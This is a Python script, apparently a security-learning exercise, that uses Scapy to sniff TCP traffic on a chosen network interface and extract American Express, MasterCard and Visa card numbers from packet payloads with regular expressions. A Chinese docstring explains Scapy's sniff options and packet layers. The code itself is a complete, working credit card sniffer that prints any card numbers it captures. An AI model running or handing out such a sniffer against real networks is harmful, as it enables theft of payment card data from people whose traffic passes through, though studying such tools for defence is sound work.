# coding=UTF-8
import re
import optparse
from scapy.all import *

'''
filter参数允许我们对Scapy嗅探的数据包指定一个BPF(Wireshark类型)的过滤器,也可以留空以嗅探所有的数据包。

　　例如：嗅探所有的HTTP数据包，tcp port 80的BPF过滤

iface参数设置嗅探器所要嗅探的网卡，留空则对所有网卡进行嗅探。

　　例如：wlan0

prn参数指定嗅探到符合过滤器条件的数据包时所调用的回调函数,这个回调函数以接受到的数据包对象作为唯一的参数

命令      效果
str(pkt)    组装数据包
hexdump(pkt)    十六进制转储
ls(pkt)     显示出字段值的列表
pkt.summary()   一行摘要
pkt.show()  针对数据包的展开试图
pkt.show2()     显示聚合的数据包（例如，计算好了校验和）
pkt.sprintf()   用数据包字段填充格式字符串
pkt.decode_payload_as()     改变payload的decode方式
pkt.psdump()    绘制一个解释说明的PostScript图表
pkt.pdfdump()   绘制一个解释说明的PDF
pkt.command()   返回可以生成数据包的Scapy命令


http://blog.csdn.net/b0rn_t0_w1n/article/details/51348015
它的结构非常清楚，首先是 Ether(以太网)层， 然后是 IP 层， 然后是 TCP 层，访问时就按张如图就可以访问各个字段信息。

要注意的是， 不是所有连接都是这几个层， Ether 是都有的， 但是 udp 连接肯定就没有 TCP 层， 而是改为 udp 层， 
ARP 包肯定就没有 IP 层， 更没有 TCP 层，如果再 arp 连接使用 dpkt[i][IP] 就会报错， 因为它没有 IP 这一层。
python 使用时可以时使用 ether 的 type 判断是不是 IP 包， 使用 ip 的 proto 判断时 tcp 还是 udp。


ether以太网的ethertype子段值
http://blog.csdn.net/nbda1121440/article/details/7821426

'''

def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall("3[47][0-9]{13}", raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if americaRE:
        print("[+] Found American Express Card: " + americaRE[0])

    if masterRE:
        print('[+] Found MasterCard Card: ' + masterRE[0])

    if visaRE:
        print('[+] Found Visa Card: ' + visaRE[0])

def main():
    parser = optparse.OptionParser('usage % prog -i<interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        print('[*] Starting Credit Card Sniffer.')
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()